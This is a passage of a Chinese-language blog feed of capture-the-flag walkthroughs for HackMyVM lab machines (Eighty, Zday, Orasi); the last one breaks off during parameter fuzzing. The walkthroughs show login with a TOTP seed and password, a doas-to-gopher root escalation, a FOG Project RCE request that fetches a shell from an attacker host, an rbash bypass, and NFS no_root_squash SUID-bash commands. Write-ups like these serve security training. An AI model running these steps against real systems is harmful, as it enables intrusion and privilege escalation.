è¿™æ˜¯ä¸€æ®µ TOTPï¼ˆåŸºäºæ—¶é—´çš„ä¸€æ¬¡æ€§å¯†ç ï¼ŒTime-Based One-Time Passwordï¼‰ é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºåŒå› ç´ èº«ä»½éªŒè¯ï¼ˆ2FAï¼‰çš„ç§å­å’Œç›¸å…³å‚æ•°<br>
2GN7KARBONVR55R7SP3UZPN3ZMæ˜¯ TOTP çš„å¯†é’¥ç§å­ï¼ˆSecret Keyï¼‰ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ª Base32 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚å®ƒç”¨äºç”Ÿæˆæ—¶é—´æ•æ„Ÿçš„ä¸€æ¬¡æ€§å¯†ç 
<br>ç®€å•æ¥è¯´å°±æ˜¯è¿˜è¦è¾“å…¥ä¸€æ¬¡éªŒè¯ç  ã€‚è¿™é‡ŒéªŒè¯ç é€‰æ‹©ä¸‹é¢ä»»æ„ä¸€ä¸ªå³å¯<br>
åˆ©ç”¨å¯†ç  8ycrois-tu0 å’ŒéªŒè¯ç ç™»å½•ä¸Šå»<br>
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# ssh susan@192.168.112.23
(susan@192.168.112.23) Password:
(susan@192.168.112.23) Verification code:
Linux eighty 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Apr  7 07:05:11 2021
susan@eighty:~$


susan@eighty:~$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: eighty

PWNED DATE: Thu 19 Dec 2024 11:48:18 PM EST

WHOAMI: uid=1000(susan) gid=1000(susan) groups=1000(susan),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

FLAG: hmv8use0red

------------------------

<br><br>susan@eighty:~$ find / -perm -4000 2&gt;/dev/null
/usr/local/bin/doas
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/mount

<br>è¿™é‡Œå‘ç°äº†ä¸€ä¸ª doas<br>
<a rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation#doas" target="_blank">https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation#doas</a><br>
æœ‰ä¸€äº›æ›¿ä»£ sudo äºŒè¿›åˆ¶æ–‡ä»¶çš„é€‰é¡¹ï¼Œä¾‹å¦‚ OpenBSD çš„ doasï¼Œè¯·è®°å¾—æ£€æŸ¥å…¶é…ç½®æ–‡ä»¶ /etc/doas.confã€‚<br>
permit nopass demo as root cmd vim
<br>susan@eighty:~$ find / -name doas.conf 2&gt;/dev/null
/usr/local/etc/doas.conf
susan@eighty:~$ cat /usr/local/etc/doas.conf
permit nolog susan as root cmd gopher
<br>å¯ä»¥å‘ç°å…è®¸æˆ‘ä»¬ä½¿ç”¨ root æƒé™æ‰§è¡Œ gopher<br>doas -u root gopher
è¾“å¯†ç  ç„¶åè¾“å…¥ï¼

Spawning your default shell.  Type 'exit' to return to Gopher.

root@eighty:/home/susan# id
uid=0(root) gid=0(root) groups=0(root)
root@eighty:/home/susan# whoami
root
root@eighty:/home/susan#


<br>root@eighty:~# sh fl4g.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: eighty

PWNED DATE: Fri Dec 20 00:01:53 EST 2024

WHOAMI: uid=0(root) gid=0(root) groups=0(root)

FLAG: rooted80shmv

------------------------

]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/42.eighty.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/42.eighty.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[41.Zday]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ç›®å½•æ‰«æ" data-href="#2.2. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.2._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç›®å½•æ‰«æ</a>


<br><a data-tooltip-position="top" aria-label="3. fog project Rce" data-href="#3. fog project Rce" href="https://www.c1trus.top/about:blank#3._fog_project_Rce" class="internal-link" target="_self" rel="noopener nofollow">3. fog project Rce</a>

<br><a data-tooltip-position="top" aria-label="3.1. sshç»•è¿‡é™åˆ¶" data-href="#3.1. sshç»•è¿‡é™åˆ¶" href="https://www.c1trus.top/about:blank#3.1._sshç»•è¿‡é™åˆ¶" class="internal-link" target="_self" rel="noopener nofollow">3.1. sshç»•è¿‡é™åˆ¶</a>


<br><a data-tooltip-position="top" aria-label="4. NFS no_root_squash" data-href="#4. NFS no_root_squash" href="https://www.c1trus.top/about:blank#4._NFS_no_root_squash" class="internal-link" target="_self" rel="noopener nofollow">4. NFS no_root_squash</a>
<br><a data-tooltip-position="top" aria-label="5. bashè¿è¡Œä¸äº†æ€ä¹ˆåŠ" data-href="#5. bashè¿è¡Œä¸äº†æ€ä¹ˆåŠ" href="https://www.c1trus.top/about:blank#5._bashè¿è¡Œä¸äº†æ€ä¹ˆåŠ" class="internal-link" target="_self" rel="noopener nofollow">5. bashè¿è¡Œä¸äº†æ€ä¹ˆåŠ</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Zday" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Zday</a><br>
ä½œè€… sml<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br><br>
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Zday]
â””â”€# nmap 192.168.56.7
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 19:53 EST
Nmap scan report for 192.168.56.7
Host is up (0.00029s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
2049/tcp open  nfs
3306/tcp open  mysql
MAC Address: 08:00:27:36:9F:B5 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds

<br>é¦–é¡µæ˜¯ appache<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Zday]
â””â”€# dirsearch -u http://192.168.56.7
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/Zday/reports/http_192.168.56.7/_24-12-19_19-55-54.txt

Target: http://192.168.56.7/


[19:56:05] 302 -    0B  - /index.php  -&gt;  /fog/index.php
[19:56:05] 302 -    0B  - /index.php/login/  -&gt;  /fog/index.php
[19:56:10] 403 -  277B  - /server-status
[19:56:10] 403 -  277B  - /server-status/

<br><br>å‘ç°ä¸€ä¸ªfog projectçš„ç™»å½•æ¡†<br>
<img alt="Pasted image 20241219170042" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219170042.png" referrerpolicy="no-referrer"><br>
åˆ©ç”¨é»˜è®¤è´¦å·å¯†ç  fog : password ç™»å½•ä¸Šå»<br>çœ‹ä¸€ä¸‹ç‰ˆæœ¬<br>
<img alt="Pasted image 20241219170255" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219170255.png" referrerpolicy="no-referrer"><br>æœç´¢ä¸€ä¸‹ç›¸å…³çš„æ¼æ´<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Zday]
â””â”€# searchsploit fog
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
Fog Creek Software FogBugz 4.0 29 - 'default.asp' Cross-Site Scripting                                   | asp/webapps/27071.txt
FOG Forum 0.8.1 - Multiple Local File Inclusions                                                         | php/webapps/5784.txt
FOGProject 1.5.9 - File Upload RCE (Authenticated)                                                       | php/webapps/49811.txt
--------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

<br>æˆåŠŸæ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³ç‰ˆæœ¬çš„ æ–‡ä»¶ä¸Šä¼ rce<br>å°è¯•åˆ©ç”¨ä¸€ä¸‹<br><img alt="Pasted image 20241219172007" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219172007.png" referrerpolicy="no-referrer"><br>
å‚è€ƒæ–‡ç« å®Œæˆåˆ©ç”¨ <a rel="noopener nofollow" class="external-link" href="https://muzec0318.github.io/posts/articles/fog.html" target="_blank">https://muzec0318.github.io/posts/articles/fog.html</a><br>
ä½†æ˜¯æˆ‘å¡åœ¨äº†è¿™ä¸€æ­¥<br>http://192.168.56.7/fog/management/index.php?node=about&amp;sub=kernel&amp;file=aHR0cDovLzE5Mi4xNjguNTYuNi9teXNoZWxsCg==
&amp;arch=arm64
<br>å› ä¸ºå®ƒè¯·æ±‚ä¸äº†é‚£ä¸ªftp<br><br>åœ¨ç½‘ç«™åå°å¯ä»¥è·å–åˆ°ä¸€ä¸ªè´¦æˆ·åä¸å¯†ç <br>
<img alt="Pasted image 20241219174002" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219174002.png" referrerpolicy="no-referrer"><br>åˆ©ç”¨è´¦æˆ·å¯†ç SSHä¸Šå»ä¼šå‘ç°ç³»ç»Ÿä¼šç«‹é©¬ä¸­æ–­æˆ‘çš„bash<br>
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Zday]
â””â”€# ssh fogproject@192.168.56.7
fogproject@192.168.56.7's password:
Linux zday 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec 19 04:08:15 2024 from 192.168.56.6
You seem to be using the 'fogproject' system account to logon and work
on your FOG server system.

It's NOT recommended to use this account! Please create a new
account for administrative tasks.

If you re-run the installer it would reset the 'fog' account
password and therefore lock you out of the system!

Take care,
your FOGproject team
Connection to 192.168.56.7 closed.

<br>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ ssh fogproject@192.168.56.7 -t sh è¿›è¡Œç»•è¿‡<br>
ä¹Ÿæ˜¯ä¸€ä¸ªå±äº <a data-tooltip-position="top" aria-label="../æ¸—é€å§¿åŠ¿åº“/rbashç»•è¿‡" data-href="../æ¸—é€å§¿åŠ¿åº“/rbashç»•è¿‡" href="https://www.c1trus.top/24-æ¸—é€/æ¸—é€å§¿åŠ¿åº“/rbashç»•è¿‡.html" class="internal-link" target="_self" rel="noopener nofollow">rbashç»•è¿‡</a>çš„æ–¹å¼<br>
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Zday]
â””â”€# ssh fogproject@192.168.56.7 -t sh
fogproject@192.168.56.7's password:
$ whoami
fogproject
$ id
uid=1001(fogproject) gid=1001(fogproject) groups=1001(fogproject)
$
<br><br>ä½¿ç”¨è„šæœ¬æ£€æµ‹å‡ºæ¥NFSå…±äº«é‡Œé¢å¯ç”¨äº† no_root_squash<br>â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing NFS Exports Files (limit 70)
Connected NFS Mounts:
nfsd /proc/fs/nfsd nfsd rw,relatime 0 0
-rw-r--r-- 1 root root 174 Mar 10  2021 /etc/exports
/images *(ro,sync,no_wdelay,no_subtree_check,insecure_locks,no_root_squash,insecure,fsid=0)
/images/dev *(rw,async,no_wdelay,no_subtree_check,no_root_squash,insecure,fsid=1)

å…¶ä¸­ /images/dev ç›®å½•æˆ‘ä»¬å…·æœ‰è¯»å†™æƒé™
<br>å‚è€ƒåˆ©ç”¨ <a rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe" target="_blank">https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe</a><br>
<img alt="Pasted image 20241219175540" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219175540.png" referrerpolicy="no-referrer"><br>#Attacker, as root user
mkdir /tmp/pe
mount -t nfs &lt;IP&gt;:&lt;SHARED_FOLDER&gt; /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd &lt;SHAREDD_FOLDER&gt;
./bash -p #ROOT shell
<br><br>å®‰è£…hacktrick ä¸Šé¢åˆ©ç”¨å¯èƒ½ä¼šå‡ºç°bashåœ¨é¶æœºä¸Šè¿è¡Œä¸äº†<br>
æŠ¥é”™<br>$ ./bash -p
./bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./bash)
./bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.36' not found (required by ./bash)
./bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.38' not found (required by ./bash)
./bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./bash)

<br>è¿™æ˜¯ç”±äºç‰ˆæœ¬ä¸å¯¹<br>
æˆ‘ä»¬é‡æ–°ç¼–è¯‘ä¸€ä¸ªä¼ è¿‡å»å³å¯<br>åˆ° <a rel="noopener nofollow" class="external-link" href="https://ftp.gnu.org/gnu/bash/" target="_blank">https://ftp.gnu.org/gnu/bash/</a> ä¸‹è½½ä¸€ä¸ªæ—¶é—´å·®ä¸å¤šçš„ç‰ˆæœ¬ã€‚è¿™é‡Œé¶æœºæ˜¯21å¹´çš„æˆ‘å°±ä¸‹ä¸€ä¸ª21å¹´çš„bash<br>
<img alt="Pasted image 20241219182432" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219182432.png" referrerpolicy="no-referrer"><br>æ”»å‡»æœº
tar -zxvf bash-5.1.8.tar.gz
./configure --enable-static-link --without-bash-malloc
make
cp bash /tmp/pe
chmod +s /tmp/pe/bash

å—å®³æœº
./bash -p
<br>bash-5.1# cat /root/root.txt
ihavebeenherealways

bash-5.1# cat /home/estas/user.txt
whereihavebeen

]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/41.zday.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/41.Zday.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219170042.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219170042.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[40.orasi]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ç½‘ç«™æ¢æµ‹" data-href="#2.2. ç½‘ç«™æ¢æµ‹" href="https://www.c1trus.top/about:blank#2.2._ç½‘ç«™æ¢æµ‹" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç½‘ç«™æ¢æµ‹</a>
<br><a data-tooltip-position="top" aria-label="2.3. ç›®å½•æ‰«æ" data-href="#2.3. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.3._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.3. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.4. ftpåŒ¿åç™»å½•" data-href="#2.4. ftpåŒ¿åç™»å½•" href="https://www.c1trus.top/about:blank#2.4._ftpåŒ¿åç™»å½•" class="internal-link" target="_self" rel="noopener nofollow">2.4. ftpåŒ¿åç™»å½•</a>
<br><a data-tooltip-position="top" aria-label="2.5. æ–‡ä»¶åˆ†æ" data-href="#2.5. æ–‡ä»¶åˆ†æ" href="https://www.c1trus.top/about:blank#2.5._æ–‡ä»¶åˆ†æ" class="internal-link" target="_self" rel="noopener nofollow">2.5. æ–‡ä»¶åˆ†æ</a>


<br><a data-tooltip-position="top" aria-label="3. flask/jinja2 æ¨¡ç‰ˆæ³¨å…¥" data-href="#3. flask/jinja2 æ¨¡ç‰ˆæ³¨å…¥" href="https://www.c1trus.top/about:blank#3._flask/jinja2_æ¨¡ç‰ˆæ³¨å…¥" class="internal-link" target="_self" rel="noopener nofollow">3. flask/jinja2 æ¨¡ç‰ˆæ³¨å…¥</a>

<br><a data-tooltip-position="top" aria-label="3.1. å‚æ•°çˆ†ç ´" data-href="#3.1. å‚æ•°çˆ†ç ´" href="https://www.c1trus.top/about:blank#3.1._å‚æ•°çˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">3.1. å‚æ•°çˆ†ç ´</a>
<br><a data-tooltip-position="top" aria-label="3.2. å·¥å…·åˆ©ç”¨" data-href="#3.2. å·¥å…·åˆ©ç”¨" href="https://www.c1trus.top/about:blank#3.2._å·¥å…·åˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">3.2. å·¥å…·åˆ©ç”¨</a>
<br><a data-tooltip-position="top" aria-label="3.3. åå¼¹shell" data-href="#3.3. åå¼¹shell" href="https://www.c1trus.top/about:blank#3.3._åå¼¹shell" class="internal-link" target="_self" rel="noopener nofollow">3.3. åå¼¹shell</a>


<br><a data-tooltip-position="top" aria-label="4. www-dataææƒç”¨æˆ·kori" data-href="#4. www-dataææƒç”¨æˆ·kori" href="https://www.c1trus.top/about:blank#4._www-dataææƒç”¨æˆ·kori" class="internal-link" target="_self" rel="noopener nofollow">4. www-dataææƒç”¨æˆ·kori</a>
<br><a data-tooltip-position="top" aria-label="5. koriç”¨æˆ·ææƒiridaç”¨æˆ·" data-href="#5. koriç”¨æˆ·ææƒiridaç”¨æˆ·" href="https://www.c1trus.top/about:blank#5._koriç”¨æˆ·ææƒiridaç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">5. koriç”¨æˆ·ææƒiridaç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="6. iridaç”¨æˆ·ææƒroot" data-href="#6. iridaç”¨æˆ·ææƒroot" href="https://www.c1trus.top/about:blank#6._iridaç”¨æˆ·ææƒroot" class="internal-link" target="_self" rel="noopener nofollow">6. iridaç”¨æˆ·ææƒroot</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Orasi" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Orasi</a><br>
ä½œè€… alienum<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# nmap -sCV 192.168.212.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-06 11:57 CST
Nmap scan report for bbr.thl (192.168.212.4)
Host is up (0.00058s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.212.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Feb 11  2021 pub
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 8a:07:93:8e:8a:d6:67:fe:d0:10:88:14:61:49:5a:66 (RSA)
|   256 5a:cd:25:31:ec:f2:02:a8:a8:ec:32:c9:63:89:b2:e3 (ECDSA)
|_  256 39:70:57:cc:bb:9b:65:50:36:8d:71:00:a2:ac:24:36 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn''t have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.7.3)
|_http-server-header: Werkzeug/1.0.1 Python/3.7.3
|_http-title: 404 Not Found
MAC Address: 08:00:27:4B:94:89 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds

â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# nmap 192.168.212.4 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-06 11:58 CST
Nmap scan report for bbr.thl (192.168.212.4)
Host is up (0.00038s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
MAC Address: 08:00:27:4B:94:89 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/orasi]
â””â”€# curl http://192.168.212.4
&lt;head&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Orasi&lt;/h1&gt;
&lt;br&gt;
&lt;p&gt;6 6 1337leet&lt;/p&gt;
&lt;/body&gt;

<br>è·å–åˆ°ä¸€ä¸ªæç¤º<br>
6 6 1337leet<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/orasi]
â””â”€# dirsearch -u http://192.168.212.4
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/orasi/reports/http_192.168.212.4/_24-12-06_12-07-54.txt

Target: http://192.168.212.4/

[12:07:54] Starting:

Task Completed


<br>æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿<br><br>å¯ä»¥è·å–åˆ°ä¸€ä¸ªELFç±»å‹çš„æ–‡ä»¶<br>ftp&gt; ls -a
229 Entering Extended Passive Mode (|||45415|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 11  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Feb 11  2021 ..
-rw-r--r--    1 ftp      ftp         16976 Feb 07  2021 url

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/orasi]
â””â”€# file url
url: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ef3648aae50173281b64e2d9f71511b1b4abb0a3, for GNU/Linux 3.2.0, not stripped
<br><br>ç°åœ¨åº”è¯¥æ˜¯è¦ä»è¿™ä¸ªæ–‡ä»¶å¼€å§‹å…¥æ‰‹äº†<br>
å¯¹Urlæ–‡ä»¶è¿›è¡Œé€†å‘åˆ†æ<br>
è¿™ä¸ªçœ‹èµ·æ¥å°±åƒæ˜¯ä¸€ä¸ªè·¯å¾„<br>
<img alt="Pasted image 20241206121115" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206121115.png" referrerpolicy="no-referrer"><br>
å°†å…¶å‡­å€Ÿèµ·æ¥<br>
/sh4d0w$s<br>
å°è¯•è®¿é—® <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/orasi]
â””â”€# curl http://192.168.212.4//sh4d0w$s
&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;

<br>çœ‹æ¥ä¸æ˜¯çš„<br>è¿˜æœ‰ä¸€ä¸ª5000ç«¯å£<br>
<img alt="Pasted image 20241206122151" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206122151.png" referrerpolicy="no-referrer"><br>
è¿™é‡Œæç¤ºæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå‚æ•°<br>
æŸ¥çœ‹Serverå¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªflaskæ¡†æ¶ï¼Œé‚£å¾ˆå¯èƒ½å°±æ˜¯ä¸€ä¸ªæ¨¡ç‰ˆæ³¨å…¥äº†<br><br><img alt="Pasted image 20240408231714" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020240408231714.png" referrerpolicy="no-referrer"><br>
ä»ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹å‡º jinja2 æ¨¡ç‰ˆç«¯å£æ˜¯5000<br>
é‚£è¿™ä¸ªé¶æœºçš„å¤šåŠä¹Ÿæ˜¯jinja2çš„æ¨¡ç‰ˆ<br>ä½†æ˜¯è¦æ³¨å…¥é‚£æˆ‘ä»¬è‚¯å®šæ˜¯éœ€è¦ä¸€ä¸ªå‚æ•°çš„<br><br>è¿™ä¸ªå‚æ•°å¯ä»¥å°è¯•çˆ†ç ´<br>
è¯•äº†ä¸€ä¸‹å¸¸ç”¨çš„å‡ ä¸ªå­—å…¸æ²¡æœ‰çˆ†ç ´å‡ºæ¥<br>æˆ‘æƒ³åˆ°äº†ä¹‹å‰ç½‘ç«™é¦–é¡µç»™æˆ‘ä»¬çš„ä¸€ä¸ªæç¤º 6 6 1337leet<br>
è¿™çœ‹ç€åƒæ˜¯ä¸€ä¸ªcrunshç”Ÿæˆå­—å…¸çš„å‚æ•°<br>
å°è¯•ç”¨è¿™ä¸ªç”Ÿæˆå­—å…¸<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/orasi]
â””â”€# crunch 6 6 leet1337 &gt; wordlist.txt
Crunch will now generate the following amount of data: 326592 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 46656

<br>ç„¶åè¿›è¡Œçˆ†ç ´<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/orasi]
â””â”€# ffuf -u 'http://192.168.212.4:5000/sh4d0w$s?FUZZ=1' -w wordlist.txt |grep -v 'Size: 8'

        /'___\  /'___\           /'___\
